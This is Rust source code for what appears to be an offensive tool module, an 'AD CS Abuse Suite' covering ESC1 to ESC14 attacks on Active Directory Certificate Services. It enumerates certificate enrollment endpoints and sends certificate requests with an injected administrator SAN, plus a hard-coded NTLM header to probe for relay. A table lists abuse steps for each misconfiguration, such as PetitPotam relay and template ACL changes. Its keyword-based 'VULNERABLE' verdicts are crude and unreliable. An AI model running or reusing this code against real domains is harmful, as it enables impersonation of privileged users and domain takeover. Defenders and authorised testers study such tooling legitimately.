use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const ADCS_ENDPOINTS: &[(&str, &str)] = &[
    ("CertSrv", "/certsrv/Default.asp"),
    ("CertEnroll", "/CertEnroll/"),
    ("CES", "/CertificateRegistration/"),
    ("NDES", "/NDES/"),
    ("Web Enrollment", "/certsrv/"),
    ("ICA", "/certsrv/certhelp.asp"),
    ("Policy", "/certsrv/polhelp.asp"),
    ("CA cert", "/certsrv/certnew.cer"),
    ("CA chain", "/certsrv/certnew.p7b"),
    ("CRL", "/CertEnroll/target-CA.crl"),
    ("OCSP", "/ocsp"),
    ("SCEP", "/scep"),
    ("MS-WCCE", "/wcce"),
    ("Autoenroll", "/certsrv/autoenroll.asp"),
    ("CertReq", "/certsrv/certfnsh.asp"),
];

const ESC_VULNERABILITIES: &[(&str, &str, &str)] = &[
    (
        "ESC1 — Client auth + SAN",
        "Template allows ENROLLEE_SUPPLIES_SUBJECT and Client Authentication EKU",
        "Request cert with arbitrary SAN (admin@target.com) for authentication as any user",
    ),
    (
        "ESC1 — Low-priv enrollment",
        "Template grants enrollment to low-priv users (Domain Users, Authenticated Users)",
        "Any authenticated user can request cert with arbitrary subject",
    ),
    (
        "ESC2 — Any Purpose EKU",
        "Template has Any Purpose or no EKU restriction",
        "Cert can be used for any purpose including authentication",
    ),
    (
        "ESC3 — CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT",
        "Template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT and no manager approval",
        "Subject injection for impersonation",
    ),
    (
        "ESC4 — Vulnerable ACL",
        "Template ACL grants Write/FullControl to low-priv users",
        "Modify template to add ENROLLEE_SUPPLIES_SUBJECT",
    ),
    (
        "ESC5 — Vulnerable PKI ACL",
        "CA or PKI object ACL grants control to low-priv users",
        "Modify CA config or publish templates",
    ),
    (
        "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2",
        "CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 enabled",
        "SAN injection on any template regardless of template setting",
    ),
    (
        "ESC7 — CA Manager access",
        "Low-priv user has ManageCA or ManageCertificates right",
        "Enable EDITF_ATTRIBUTESUBJECTALTNAME2 or approve pending requests",
    ),
    (
        "ESC8 — NTLM relay to HTTP",
        "Web enrollment endpoint allows NTLM relay",
        "Relay NTLM auth from PetitPotam to /certsrv/certfnsh.asp",
    ),
    (
        "ESC9 — No security extension",
        "Template has no security extension (szOID_NT_PRINCIPAL_NAME)",
        "Cert can be used across security contexts",
    ),
    (
        "ESC10 — Client auth via UPN",
        "CA allows UPN in SAN for client auth",
        "Request cert with victim UPN in SAN",
    ),
    (
        "ESC11 — Relay via RPC",
        "ICPR interface allows NTLM relay over RPC",
        "Relay NTLM to CA via MS-ICPR",
    ),
    (
        "ESC12 — Shell access to machine",
        "User with shell access can use machine cert for auth",
        "Extract machine cert from local store",
    ),
    (
        "ESC13 — Certificate linking",
        "Template linked to app policy requiring specific group",
        "Bypass group restriction via cert policy",
    ),
    (
        "ESC14 — NTLM relay to LDAPS",
        "CA published via LDAPS with relay-compatible binding",
        "Relay NTLM to LDAPS for cert enrollment",
    ),
];

pub async fn abuse(
    url: &str,
    ca_name: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} AD CS Abuse Suite (ESC1-ESC14)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} CA: {}", "[*]".cyan().bold(), ca_name);
    println!(
        "{} {} endpoints, {} ESC checks",
        "[*]".cyan().bold(),
        ADCS_ENDPOINTS.len(),
        ESC_VULNERABILITIES.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!(
        "\n{} [1/2] AD CS endpoint discovery...",
        "[*]".cyan().bold()
    );
    let mut found = Vec::new();
    for (name, path) in ADCS_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200 || status == 301 || status == 302;
                let has_cert = body.contains("certificate") || body.contains("Certificate");
                let has_enroll =
                    body.contains("enroll") || body.contains("Enroll") || body.contains("request");
                let has_auth = status == 401;
                let tag = if accessible {
                    if has_enroll {
                        "ENROLLMENT".red().bold().to_string()
                    } else if has_cert {
                        "CERT SRVC".green().bold().to_string()
                    } else {
                        "accessible".green().to_string()
                    }
                } else if has_auth {
                    "auth".yellow().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };
                println!(
                    "  {} {:20} {:35} status={} {}",
                    "*".cyan(),
                    name,
                    path,
                    status,
                    tag
                );
                if accessible {
                    found.push(*name);
                }
            }
            Err(_) => {
                println!("  {} {:20} {:35} error", "*".red(), name, path);
            }
        }
    }

    println!(
        "\n{} [2/2] ESC vulnerability checks...",
        "[*]".cyan().bold()
    );
    println!(
        "  {} Checking {} ESC vulnerability paths...",
        "*".cyan(),
        ESC_VULNERABILITIES.len()
    );
    let mut results = Vec::new();

    for (name, condition, impact) in ESC_VULNERABILITIES {
        let cert_url = format!("{}/certsrv/certfnsh.asp", base);
        let cert_req = format!(
            "Attribute=SubjectAlternativeName&SAN={}&CertificateTemplate={}User&CertificateAuthority={}&Encoding=X509",
            "admin@target.com", ca_name, ca_name
        );

        let mut req = client
            .post(&cert_url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(cert_req);

        if name.contains("ESC8") || name.contains("NTLM") || name.contains("Relay") {
            req = client.get(format!("{}/certsrv/Default.asp", base)).header(
                "Authorization",
                "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==",
            );
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let has_www_auth = resp.headers().get("www-authenticate").is_some();
                let body = resp.text().await.unwrap_or_default();
                let has_cert = body.contains("certificate")
                    || body.contains("Certificate")
                    || body.contains("cert");
                let has_error =
                    body.contains("error") || body.contains("denied") || body.contains("Error");
                let has_ntlm = body.contains("NTLM") || has_www_auth;
                let tag = if has_cert && !has_error {
                    "VULNERABLE".red().bold().to_string()
                } else if has_ntlm
                    && (name.contains("ESC8") || name.contains("NTLM") || name.contains("Relay"))
                {
                    "NTLM RELAY".red().bold().to_string()
                } else if has_error {
                    "safe".green().to_string()
                } else if status == 401 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:35} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    tag
                );
                println!("    {} Condition: {}", ">".dimmed(), condition);
                println!("    {} Impact: {}", ">".dimmed(), impact);

                if (has_cert && !has_error)
                    || (has_ntlm
                        && (name.contains("ESC8")
                            || name.contains("NTLM")
                            || name.contains("Relay")))
                {
                    results.push(*name);
                }
            }
            Err(_) => {
                println!(
                    "  {} [{:02}] {:35} error",
                    "*".red(),
                    results.len() + 1,
                    name
                );
            }
        }
    }

    println!(
        "\n{} {} endpoints found, {} / {} ESC vulnerabilities detected",
        "[*]".cyan().bold(),
        found.len(),
        results.len(),
        ESC_VULNERABILITIES.len()
    );

    if !results.is_empty() {
        let has_esc1 = results.iter().any(|n| n.contains("ESC1"));
        let has_esc6 = results.iter().any(|n| n.contains("ESC6"));
        let has_esc8 = results.iter().any(|n| n.contains("ESC8"));
        let has_esc4 = results.iter().any(|n| n.contains("ESC4"));
        if has_esc1 {
            println!(
                "{} [CRITICAL] ESC1 — Subject injection for client auth = domain takeover!",
                "[!]".red().bold()
            );
        }
        if has_esc6 {
            println!(
                "{} [CRITICAL] ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 = SAN injection on any template!",
                "[!]".red().bold()
            );
        }
        if has_esc8 {
            println!(
                "{} [CRITICAL] ESC8 — NTLM relay to web enrollment = authentication as any user!",
                "[!]".red().bold()
            );
        }
        if has_esc4 {
            println!(
                "{} [HIGH] ESC4 — Vulnerable template ACL = template modification!",
                "[!]".red().bold()
            );
        }
    } else {
        println!(
            "{} No AD CS vulnerabilities detected.",
            "[-]".green().bold()
        );
    }

    Ok(())
}
